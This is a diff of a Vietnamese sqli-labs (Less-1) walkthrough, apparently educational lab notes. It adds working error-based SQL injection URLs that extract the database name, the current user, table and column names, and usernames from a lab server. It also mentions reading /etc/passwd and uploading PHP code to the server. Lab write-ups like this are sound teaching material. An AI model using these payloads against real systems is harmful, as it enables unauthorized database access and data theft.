@@ -47,45 +47,55 @@ select name, password from table where id = '1'
 
 ![](../images/sqli-labs/Less-1/l17.png)
 
-Dựa vào đây ta có thể show toàn bộ user và password trong table đó bằng cách tăng dần số giá trị ở trong `limit`
+Tận dụng đây ta có thể show ra một số thông tin
 
-![](../images/sqli-labs/Less-1/l18.png)
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-1/l19.png)
+![](../images/sqli-labs/Less-1/01.png)
 
-Tận dụng việc này ta có thể show tìm kiếm một số thông tin
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select user()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-Đọc file /etc/passwd
+![](../images/sqli-labs/Less-1/02.png)
 
-![](../images/sqli-labs/Less-1/l114.png)
+Show các bảng bên trong database
 
-Show database hiện tại
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select table_name from information_schema.tables where table_schema='security' limit 0,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-1/l112.png)
+![](../images/sqli-labs/Less-1/03.png)
 
-Show user đang thao tác với database
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select table_name from information_schema.tables where table_schema='security' limit 1,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-1/l113.png)
+![](../images/sqli-labs/Less-1/04.png)
 
-Show table trong DB 
+Có thể show được các cột bên trong một bảng
 
-![](../images/sqli-labs/Less-1/l116.png)
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select column_name from information_schema.columns where table_name='users' limit 0,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-1/l117.png)
+![](../images/sqli-labs/Less-1/05.png)
 
-Ta cũng có thể show các cột trong các bảng
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select column_name from information_schema.columns where table_name='users' limit 1,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-![](../images/sqli-labs/Less-1/l118.png)
+![](../images/sqli-labs/Less-1/06.png)
 
-![](../images/sqli-labs/Less-1/l119.png)
+Ta có thể show dữ liệu bên trong một bảng
 
-![](../images/sqli-labs/Less-1/l120.png)
+```
+http://192.168.84.233/sqli-labs/Less-1/?id=1' and (SELECT 0 FROM (SELECT count(*), CONCAT((select username from users limit 0,1), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y) --+
+```
 
-Show thông tin ở các bảng khác
-
-![](../images/sqli-labs/Less-1/l121.png)
-
-![](../images/sqli-labs/Less-1/l122.png)
+![](../images/sqli-labs/Less-1/08.png)
 
 Ta có thể up một đoạn code PHP lên server
 
